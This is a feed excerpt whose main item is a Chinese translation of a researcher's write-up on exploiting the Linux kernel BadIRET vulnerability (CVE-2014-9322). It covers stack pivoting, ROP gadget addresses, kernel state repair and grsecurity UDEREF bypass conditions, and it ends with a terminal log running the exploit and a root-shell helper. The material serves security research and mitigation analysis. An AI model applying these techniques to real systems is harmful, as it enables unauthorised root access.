https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy&lt;/p&gt;

&lt;p&gt;[5] Increasing DHE strength on Apache 2.4.x (Ivan Ristić’s blog; 15 August 2013)
http://blog.ivanristic.com/2013/08/increasing-dhe-strength-on-apache.html&lt;/p&gt;

&lt;p&gt;[6] TLS Renegotiation and Denial of Service Attacks (Qualys Security Labs Blog, October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/31/tls-renegotiation-and-denial-of-service-attacks&lt;/p&gt;

&lt;p&gt;[7] SSL and TLS Authentication Gap Vulnerability Discovered (Qualys Security Labs Blog; November 2009)
https://community.qualys.com/blogs/securitylabs/2009/11/05/ssl-and-tls-authentication-gap-vulnerability-discovered&lt;/p&gt;

&lt;p&gt;[8] CRIME: Information Leakage Attack against SSL/TLS (Qualys Security Labs Blog; September 2012)
https://community.qualys.com/blogs/securitylabs/2012/09/14/crime-information-leakage-attack-against-ssltls&lt;/p&gt;

&lt;p&gt;[9] Defending against the BREACH Attack (Qualys Security Labs; 7 August 2013)
https://community.qualys.com/blogs/securitylabs/2013/08/07/defending-against-the-breach-attack&lt;/p&gt;

&lt;p&gt;[10] Internet-Draft: Prohibiting RC4 Cipher Suites (A. Popov, 1 October 2014)
http://datatracker.ietf.org/doc/draft-ietf-tls-prohibiting-rc4/&lt;/p&gt;

&lt;p&gt;[11] Mitigating the BEAST attack on TLS (Qualys Security Labs Blog; October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/17/mitigating-the-beast-attack-on-tls&lt;/p&gt;

&lt;p&gt;[12] Is BEAST Still a Threat? (Qualys Security Labs; 10 September 2013)
https://community.qualys.com/blogs/securitylabs/2013/09/10/is-beast-still-a-threat&lt;/p&gt;

&lt;p&gt;[13] This POODLE bites: exploiting the SSL 3.0 fallback (Google Online Security Blog, 14 October 2014)
http://googleonlinesecurity.blogspot.co.uk/2014/10/this-poodle-bites-exploiting-ssl-30.html&lt;/p&gt;

&lt;p&gt;[14] About EV SSL Certificates (CA/B Forum web site)
https://www.cabforum.org/certificates.html&lt;/p&gt;

&lt;p&gt;[T1] HAS THE RSA ALGORITHM BEEN COMPROMISED AS A RESULT OF BERNSTEIN’S PAPER?
http://www.emc.com/emc-plus/rsa-labs/historical/has-the-rsa-algorithm-been-compromised.htm&lt;/p&gt;

&lt;p&gt;[T2] Poodle Bites TLS
https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls&lt;/p&gt;

&lt;p&gt;[T3] Lucky Thirteen: Breaking the TLS and DTLS Record Protocols
http://www.isg.rhul.ac.uk/tls/Lucky13.html&lt;/p&gt;
</description>
        <pubDate>Wed, 29 Jul 2015 01:59:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</guid>
        
        
        <category>cryptography</category>
        
      </item>
    
      <item>
        <title>后续故事：数字军火级别的&quot;BadIRET&quot;漏洞利用(CVE-2014-9322)</title>
        <description>&lt;p&gt;作者：pi3, July 4 2015&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://blog.pi3.com.pl/?p=509&quot;&gt;Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck, July 5 2015&lt;/p&gt;

&lt;p&gt;Shawn：nergal在2015年2月公开的针对&lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/07/05/badiret-analysis.html&quot;&gt;BadIRET漏洞的分析文章&lt;/a&gt;仿佛就在昨天，但Linux内核社区对安全的态度的确比10年还糟糕，Linux内核社区一如既往坚持”Security through obscurity”这种简单到根本不用考虑斯拉夫兵工厂的威胁建模，不辛的是，BadIRET又是一例Linux内核社区认为几乎不可利用但实际是可利用的漏洞，更糟糕的是一些商业GNU/Linux厂商因为各种原因（在后棱镜时代，不得不考虑非商业因素的可能）基本按照&lt;a href=&quot;https://securityblog.redhat.com/2015/04/08/dont-judge-the-risk-by-the-logo/&quot;&gt;是否有公开的漏洞利用会成为他们对于风险评估的重要指标&lt;/a&gt;，这种说法好像是当0-day exploit从来都不存在一样，这的确是一个黑暗的时代，就算没有Mr.Snowden，这的确也称的上是一个黑暗的信息时代，anyway，这次pi3公开了BadIRET的漏洞利用代码，这对于安全研究人员来说是一个好事，也希望整个事件能帮助个人以及企业GNU/Linux用户对于安全有正确的认识。&lt;/p&gt;

&lt;p&gt;一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&amp;gt; exploitable bug(vulnerability) –&amp;gt; poc –&amp;gt; exploit –&amp;gt; reliable/weaponized exploit。虽然skiddie都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但让数字军火商或者斯拉夫兵工厂关心的漏洞属于能到最后两个阶段的vulnerability。&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;by pi3&lt;/p&gt;

&lt;p&gt;Hi,&lt;/p&gt;

&lt;p&gt;分析&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&quot;&gt;CVE-2014-9322&lt;/a&gt;的旅程并非一帆风顺，但它值得我们花一些时间去分析所有的信息。我会尽力…&lt;/p&gt;

&lt;h2 id=&quot;introduction--non-technical-almost&quot;&gt;1) Introduction – non-technical (almost)&lt;/h2&gt;

&lt;p&gt;一切都开始于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090&quot;&gt;CVE-2014-9090&lt;/a&gt;。这个漏洞是由Andy Lutomirski发现的，引用MITRE的描述：&lt;/p&gt;
&lt;pre&gt;
Linux内核3.17.4在arch/x86/kernel/traps.c里的do_double_fault函数没有正确
的处理SS(Stack Segment)寄存器相关的错误处理，导致本地用户可以发启DoS攻
击让内核panic(...)
&lt;/pre&gt;

&lt;p&gt;这个顶多导致本地DoS攻击的洞对于防御者而言听起来并不是那么重要（但也引起了一定的注意，因为毕竟是一个漏洞），对于攻击者的角度也是一样，因为即使利用成功也无法获得巨大利益( Shawn:相对于获得root而言)。&lt;/p&gt;

&lt;p&gt;“有趣”的是在Borislav Petkov问了一些问题后，Andy Lutomirski在相同的功能里发现了另一个被第一个漏洞掩盖的漏洞。不幸(幸运)的是，这是一个很严重的漏洞。Linux内核在x86架构下没有恰当的处理于SS寄存器有关的错误处理。引用自MITRE：&lt;/p&gt;
&lt;pre&gt;
&quot;(...)通过触发一个IRET指令从一个错误的空间去去访问一个GS基地址从而让本地用户获取最高权限&quot;
&lt;/pre&gt;

&lt;p&gt;这个漏洞的特性听起来很熟悉吗？&lt;/p&gt;

&lt;p&gt;那Rafal ‘n3rgal’ Wojtczuk的研究最终停止于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217&quot;&gt;CVE-2012-0217&lt;/a&gt;呢？(这个直接指向了&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744&quot;&gt;CVE-2006-0744&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;是的…原则上两个漏洞都给我们了相同的东西 — 我们能强制内核去执行在用户空间控制的GS基地址（通过%gs寄存器）。&lt;/p&gt;

&lt;p&gt;因为一些原因CVE-2014-9322并没有引起太多注意（跟CVE-2006-0744类似），直到Rafal ‘n3rgal’ Wojtczuk在2015年2月5日在Bromium Labs的blog上&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;公布了另外震撼的研究&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;这篇分析谈到了关于这个漏洞的本质，即可以被利用为代码执行（这可不是简单的事情，点赞n3rgal的研究）和使用单个字节为NULL的写操作让整个漏洞利用成为军火级别的稳定利用，能绕过SMEP（不是SMAP）。非常推荐读读这篇分析。&lt;/p&gt;

&lt;p&gt;在这篇漏洞分析公开后引起了更多的关注（特别是grsecurity的twitter帐号:-)）。知道现在（差不多半年了）也没有公开的真正的漏洞利用去实现Rafal关于代码执行的想法。只有一个演示DoS攻击的PoC（结果和CVE-2014-9090相同 — 没多大用处）：&lt;/p&gt;

&lt;p&gt;https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;另外一个实现：&lt;/p&gt;

&lt;p&gt;https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;h2 id=&quot;more-technical-part-based-on-fedora-20---kernel-31110-301fc20x8664&quot;&gt;2) More technical part (based on Fedora 20 -&amp;gt; kernel: 3.11.10-301.fc20.x86_64)&lt;/h2&gt;

&lt;p&gt;我决定接受这个挑战去完整的实现Rafal的想法并且在成功的过程中解决了很多有趣的问题。我将以Rafal的分析文章结束作为开始，最终成功的实现stack pivoting和执行ROP gadgets（在他的描述里是去关掉CR4寄存器中关掉SMEP和在用户空间的页去执行’真’的shellcode/kernelcode）。&lt;/p&gt;

&lt;p&gt;*) Stack pivoting和ROP执行于follow_link()函数的上下文，这个函数是inline所以整个实现都在path_openat()的代码段里。这里是概述的上下文流程：&lt;/p&gt;
&lt;pre&gt;
SyS_open -&amp;gt; SYSC_open -&amp;gt; do_sys_open -&amp;gt; do_filp_open -&amp;gt; path_openat -&amp;gt; follow_link()
&lt;/pre&gt;

&lt;p&gt;Inline函数调用相对地址，这可以最终重定向到我们的代码：&lt;/p&gt;
&lt;pre&gt;
...
   0xffffffff811b84ab &amp;lt;+955&amp;gt;:   jmpq   0xffffffff811b81b3 
   0xffffffff811b84b0 &amp;lt;+960&amp;gt;:   movl   $0x4,0x40(%r12)
   0xffffffff811b84b9 &amp;lt;+969&amp;gt;:   mov    0x30(%r15),%rax
   0xffffffff811b84bd &amp;lt;+973&amp;gt;:   mov    %r15,%rdi
   0xffffffff811b84c0 &amp;lt;+976&amp;gt;:   mov    %r12,%rsi
   0xffffffff811b84c3 &amp;lt;+979&amp;gt;:   mov    0x20(%rax),%rax
   0xffffffff811b84c7 &amp;lt;+983&amp;gt;:   callq  *0x8(%rax)
                                ^^^^^^^^^^^^^^^^^
   0xffffffff811b84ca &amp;lt;+986&amp;gt;:   cmp    $0xfffffffffffff000,%rax
   0xffffffff811b84d0 &amp;lt;+992&amp;gt;:   mov    %rax,%r15
   0xffffffff811b84d3 &amp;lt;+995&amp;gt;:   jbe    0xffffffff811b8532 
   0xffffffff811b84d5 &amp;lt;+997&amp;gt;:   mov    %r12,%rdi
   0xffffffff811b84d8 &amp;lt;+1000&amp;gt;:  mov    %eax,%ebx
   0xffffffff811b84da &amp;lt;+1002&amp;gt;:  callq  0xffffffff811b2930 
...
&lt;/pre&gt;

&lt;p&gt;在我们的代码执行后第一个问题来了，所有调用函数path_put(), do_last(), dput(), mntput()或者put_link()可能都会遇到内核锁。因为栈已经被pivoted可不会带来一个好的结局。另外，path_openat()里有很多inline函数，一些寄存器有特殊意义（指针指向特定的结构或者对象），所以内核去访问某个点可能会直接造成内核崩溃。&lt;/p&gt;

&lt;p&gt;一开始我尝试跟踪了所有有问题的执行过程和手工修复了一些，但这条路径下的寄存器/对象/spinlocks之间有太多的关联…（btw，不幸（幸运）的是，跟之前的版本相比，Linux内核3.xx改变了raw_spin_lock的内部描述，当你打算手工同步时这会成为一个问题）。&lt;/p&gt;

&lt;p&gt;这里需要一个更好的解决方案，如果你思考下关于pivoting自己你可能会找到一个方案。如果你打算手工修复所有在这个过程中遇到的问题你也能成功。如果你找到一条路径去把原始的栈帧”恢复“到stack pivoting之前的状态，这会帮你搞定所有的锁问题，正确的对栈进行unwind以及系统会稳定的运行。这是能实现的，让我们称她为reverse stack pivoting;-)。在stack pivot后，在临时寄存器里你应该会拥有一个你想知道的栈的合法地址。在我们的场景里稍微有些复杂，因为我们失去了地址的32位的最高有效位。ROP gadgets像：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8119f1ed &amp;lt;__mem_cgroup_try_charge+1949&amp;gt;:   xchg   %eax,%esp
   0xffffffff8119f1ee &amp;lt;__mem_cgroup_try_charge+1950&amp;gt;:   retq
&lt;/pre&gt;

&lt;p&gt;为什么这些gadget会产生而32 bits会丢失呢？请阅读Rafal的文章。&lt;/p&gt;

&lt;p&gt;所以，如果我们在直接pivoting后找到了一些能保存原始栈上32位最低有效位ROP gadget，我们可以尝试在把控制权交给内核前恢复和重构原始地址。我选择了如下ROP-gadget：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8152d8fe :       push   %rax
   0xffffffff8152d8ff :       pop    %rax
   0xffffffff8152d900 :       pop    %rbp
   0xffffffff8152d901 :       retq
&lt;/pre&gt;

&lt;p&gt;去执行push %rax（这个值事实上高位被清零了）和保存值后移动栈指针。在这个点上我们可以精确的计算它会存在哪里。&lt;/p&gt;

&lt;p&gt;问题解决了（reverse-stack pivot胜利 :P）&lt;/p&gt;

&lt;p&gt;*) 如果你的shellcode执行时间过长，有很大的概率进程调度器会让更紧急的任务先执行， – 取决于当前的执行和什么样的任务会抢占。你可能经常收到APIC时间中断去更新进程时间，在有些情况下可能会带给你的漏洞利用一些麻烦，你必须考虑这些事情！&lt;/p&gt;

&lt;p&gt;btw.如果你运气不好，在做stack pivoting时刚好被抢占;p（Shawn:这种概率都遇上了你也就认了吧，可能真是上帝让你别去日你的当前目标；-））&lt;/p&gt;

&lt;p&gt;*) 我们的代码执行时但proc_root结构被损坏…;-) 这不是我们愿意看到的。如果有其他进程对/proc文件系统有任何操作，它会戏剧性的增加内核崩溃的概率。proc_root.subdir值必须尽快被恢复以避免系统被随机的crash掉。有几种可能的方法：&lt;/p&gt;

&lt;p&gt;a) 反而覆盖subdir的6 bytes只覆盖其中5个，这样其中3 bytes未碰。这意味着我们可以通过0xffff8800和最高有效位相加来轻松重构原始值，每一个单独byte最多256次尝试。内核crash的概率很低（触及到未映射的页）。另外，这个需要用户空间分配16MB去保证引用被覆盖的proc_root.subdir总是在我们控制的内存里。&lt;/p&gt;

&lt;p&gt;b) 我们可以通过’阻止’#PF来爆破整个地址。在一段很短的时间里，我们可以用一段简单程序覆盖#PF处理程序：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;从栈上获得异常&lt;/li&gt;
  &lt;li&gt;改变已知映射会造成crash的地址&lt;/li&gt;
  &lt;li&gt;重启错误处理指令&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;原生的爆破循环会继续运行&lt;/p&gt;

&lt;p&gt;c) 忽略所有的问题，仅仅去重构能通过爆破获得的剩下的bytes。很明显这很稳定和高效，我们知道HSB是0xfff8800和两个LSB bytes。我们需要找到2个未知的bytes。在Linux上（与Windows相反），内核内存不被paged out（swapped out）。去爆破中间的2个bytes来重构地址时访问到未映射的内存页概率是很低的 – believe me or not, it works well :)&lt;/p&gt;

&lt;p&gt;问题同样是如何判断地址是正确的。这很简单，struct proc_dir_entry有’parent’。我们必须找到proc_root(已知地址）的特定offset。最终，我们检查了65536个地址，#FP的概率也是很低的。我从来没遇到过那种情况。&lt;/p&gt;

&lt;p&gt;总结我们的shellcode必须：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;保存原生的栈指针值&lt;/li&gt;
  &lt;li&gt;关闭中断（防止被抢占）和开始重构被污染的proc_root.subdir值&lt;/li&gt;
  &lt;li&gt;实现真正的(s)hellcode&lt;/li&gt;
  &lt;li&gt;恢复原生栈指针&lt;/li&gt;
  &lt;li&gt;恢复栈帧指针&lt;/li&gt;
  &lt;li&gt;恢复寄存器指向的内部对象&lt;/li&gt;
  &lt;li&gt;启动中断和返回正常内核执行&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;grsecurity--uderef&quot;&gt;3) Grsecurity =&amp;gt; UDEREF&lt;/h2&gt;

&lt;p&gt;之前我提到过Rafal的研究曾经被spender给“看到”过：&lt;/p&gt;

&lt;p&gt;http://twitter.com/grsecurity/status/562363332079144960
http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;另外，一些人建议UDEREF和SMAP一样能高效的防御这个漏洞：&lt;/p&gt;

&lt;p&gt;http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;pre&gt;
&quot;这可能是一个容易的提权的漏洞利用，但除了针对带有SMAP和UDEREF的系统。在
SMAP/UDEREF上，假定mitigation都是奏效的，这个bug的影响可能会局限于大规
模的memory corruption和crash或者重启。&quot;
&lt;/pre&gt;

&lt;p&gt;这并不是完全正确。UDEREF可能跟（事实上，甚至远超）SMAP一样高效，或者仅像SMEP（在AMD64上）一样有效的防御漏洞利用。但问题出在哪里呢？目前针对AMD64平台，UDEREF有3种不同的实现：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;慢/弱的遗留实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge(Shawn：2011年）和后续CPU的强实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge和后续CPU的快/弱实现&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第一个针对AMD64平台的UDEREF实现是“弱”实现，相关信息PaX team也有描述：&lt;/p&gt;

&lt;p&gt;http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;pre&gt;
&quot;(...)所以amd64的UDEREF做了些什么呢？在用户空间-&amp;gt;内核空间的转换中基本上
unmaps了原始用户地址范围和重新映射到了不同的地址上并且标记为不可执行
/supervisor权限（所以至少直接的代码执行作为漏洞利用是无法奏效的）
&lt;/pre&gt;

&lt;p&gt;然后接着：&lt;/p&gt;

&lt;pre&gt;
&quot;(..) UDEREF/amd64不保证（合法）用户空间访问函数当用户空间被允许（一些
像特定系统作为用户空间临时访问内核内存，这在UDEREF/i386上被强制一致，而
在AMD64上则没有）不可以直接访问内核内存。所以如果有BUG能骗内核进入用户
空间访问的指针又恰好指向内核空间的话就能利用成功，这一点不像i386的实现。

另外一件糟糕的事情是用户空间的阴影区域，这造成了2个后果：1，用户空间地
址大小小于UDEREF（42 vs 47 bits，这种减小最终影响ASLR）， 2，这个阴影区
域总是映射着，所以内核代码异常访问这个区间并不会造成oops而且也是可被利
用的（如果一个漏洞利用能让内核deref这一区域里的任意地址）(...)&quot;
&lt;/pre&gt;

&lt;p&gt;== weak UDEREF ==
这意味着实际上UDEREF类似SMEP。所以如何能成功的漏洞利用有这个版本的UDEREF的系统呢？你只需要修改ROP。不像在CR4寄存器中关掉SMEP位，而是从用户空间实现完整的ROP的shellcode。这是可能的，“弱”UDEREF实现无法防御这种利用。&lt;/p&gt;

&lt;p&gt;== “new” UDEREF ==&lt;/p&gt;

&lt;p&gt;为什么“强”UDEREF实现是不同的而为什么她需要Sandy Bridge架构的支持？&lt;/p&gt;

&lt;p&gt;对，这是有趣的部分。我从没见关于”新“版UDEREF来自于官方的任何信息。我都没注意到这些实现有些变动是在我玩漏洞利用时产生的;-)&lt;/p&gt;

&lt;p&gt;强UDEREF实现使用的Sandy Bridge++特性被称为PCID，PCID在TLB中打”tags”（Shawn:有些人会翻译为标签）。UDEREF可以完全的分离用户空间和内核空间（通过创建新的PGD表）：&lt;/p&gt;
&lt;pre&gt;
static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct *tsk)
{
++#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+     if (!(static_cpu_has(X86_FEATURE_PCID))) {
+             unsigned int i;+                pgd_t *pgd;
++            pax_open_kernel();
+             pgd = get_cpu_pgd(smp_processor_id(), kernel);
+             for (i = USER_PGD_PTRS; i &amp;lt; 2 * USER_PGD_PTRS; ++i)
+                     set_pgd_batched(pgd+i, native_make_pgd(0));
+             pax_close_kernel();
+     }
+#endif

+#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+             if (static_cpu_has(X86_FEATURE_PCID)) {
+                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
+                             u64 descriptor[2];
+                             descriptor[0] = PCID_USER;
+                             asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor), &quot;a&quot;(INVPCID_SINGLE_CONTEXT) :
&quot;memory&quot;);
+                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)) {
+                                     descriptor[0] = PCID_KERNEL;
+                                     asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor),
&quot;a&quot;(INVPCID_SINGLE_CONTEXT) : &quot;memory&quot;);
+                             }
+                     } else {
+                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID_USER);
+                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL | PCID_NOFLUSH);
+                             else
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL);
+}
+             } else
+#endif
&lt;/pre&gt;

&lt;p&gt;最终，运行于内核模式的上下文将看不到任何用户空间的页。这个实现我个人相信比SMAP要强的多。为什么呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;你不能只关闭CR4寄存器里的一个bit而关掉整个mitigation&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在SMAP的情况下，你可以看到用户空间的页（有存在的页表翻译用户空间地址，’P’位已经设置）但你仅仅是不能触碰到。在”新”UDEREF的情况下，你根本看不到用户空间（内核上下文的PGD是完全不同的，没有页表描述用户空间地址。’P’没有被设置）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这个UDEREF版本最早是在grsecurity 3.0于2014年2月引入的。干得漂亮！如果PaX/Grsecurity能公布一些他们的研究细节就更棒了;-)&lt;/p&gt;

&lt;p&gt;Btw. 这2个case都是接触到用户空间地址是一样的 - #PF会被生成;-)&lt;/p&gt;

&lt;p&gt;Btw2. 同样的“强”UDEREF可以不需要硬件PCID特性也能实现。但最大的区别就是性能。如果没有硬件PCID支持的情况下从性能的角度看，这个特性会很糟糕。&lt;/p&gt;

&lt;h2 id=&quot;summarizing-&quot;&gt;== Summarizing ==&lt;/h2&gt;

&lt;p&gt;这个漏洞可以在UDEREF下被利用，但不能在使用了Sandy Bridge++特性的“新”UDEREF下被利用。&lt;/p&gt;

&lt;p&gt;事实上，你仍然可以用这个漏洞针对“新”UDEREF用作DoS攻击？如何实现呢？这个很有趣，你可以强制#PF的无限循环;-) 当内核进入do_general_protection()函数后会尝试通过以下指令让GS基读取GDT：&lt;/p&gt;

&lt;pre&gt;
    0xffffffff8172910e :       mov    %gs:0xa880,%rbx
&lt;/pre&gt;

&lt;p&gt;这个情况下GS基是指向用户空间的内存。因为这里没有PTE条目（内核看不到用户空间的页），#PF将会被产生。page_fault()函数会被执行：&lt;/p&gt;

&lt;pre&gt;
page_fault -&amp;gt; do_page_fault -&amp;gt; __do_page_fault -&amp;gt; restore_args
&lt;/pre&gt;

&lt;p&gt;这会导致再次读GDT然后下一个#PF产生，就这样一直循环下去;-) 是的，你可以让内核崩溃掉但没办法做进一步的漏洞利用。漏洞利用在这里被阻止了。&lt;/p&gt;

&lt;h2 id=&quot;funny-facts-&quot;&gt;4) Funny facts;-)&lt;/h2&gt;

&lt;p&gt;a) 当你调用pthread_create()函数时，一些版本的libthread需要创建RWX权限的内存。这在PaX/Grsec的mmap()加固是不被允许的，当pthread_create()调用mmap()时进程会被杀掉;-) 我在Ubuntu LTS上运行grsecurity加固内核时遇到过这个情况。&lt;/p&gt;

&lt;p&gt;b) 在内核3.11.10-301.fc20.x86_64的__switch_to()函数实现中使用了OSXSAVE扩展（CR4寄存器的bit 18），但内核并不检查这个CPU是否有这个扩展：&lt;/p&gt;
&lt;pre&gt;
     0xffffffff81011714 &amp;lt;__switch_to+644&amp;gt;    xsaveopt64 (%rdi)
&lt;/pre&gt;

&lt;p&gt;__switch_to()是在禁用中断时运行，如果OSXSAVE扩展没有打开的话，CPU会生成一个#UD造成死锁。在进入__switch_to()指令之前，不管是否关闭中断都会锁住runqueue运行队列，在#UD的情况下不会被解锁。&lt;/p&gt;

&lt;p&gt;我好奇如果有人真的遇到过这个问题;-)&lt;/p&gt;

&lt;p&gt;c) Fedora 20作为测试环境，这个漏洞利用非常稳定（&lt;a href=&quot;http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&quot;&gt;源代码在我的网站上已经公布&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;
[pi3@localhost clean_9322]$ cat z_shell.c
#include 

int main(void) {

   char *p_arg[] = { &quot;/bin/sh&quot;, NULL };

   setuid(0);
   seteuid(0);
   setgid(0);
   setegid(0);
   execv(&quot;/bin/sh&quot;,p_arg,NULL);

}
[pi3@localhost clean_9322]$ gcc z_shell.c -o z_shell
[pi3@localhost clean_9322]$ cp z_shell /tmp/pi3
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
sh-4.2$ exit
exit
[pi3@localhost clean_9322]$ gcc -o procrop procrop.c setss.S
[pi3@localhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
swapgs.c: In function ‘main’:
swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
               : &quot;r&quot;(4), &quot;r&quot;((int)p_to_d), &quot;r&quot;(1)
                             ^
[pi3@localhost clean_9322]$ ./procrop

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

                Usage: ./procrop 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$ ./procrop 1 &amp;amp;
[1] 5827
[pi3@localhost clean_9322]$
        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ps aux |grep procr
pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=auto procr
[pi3@localhost clean_9322]$ ./p_write8

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

                Usage: ./p_write8 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ./p_write8 1

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64
        [+] mmap() memory in first 2GB of address space... DONE!
        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
        [+] Creating LDT for this process... DONE!
        [+] Press enter to start fun-game...
[exploit] pthread runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1]+  Done                    ./procrop 1
Segmentation fault (core dumped)
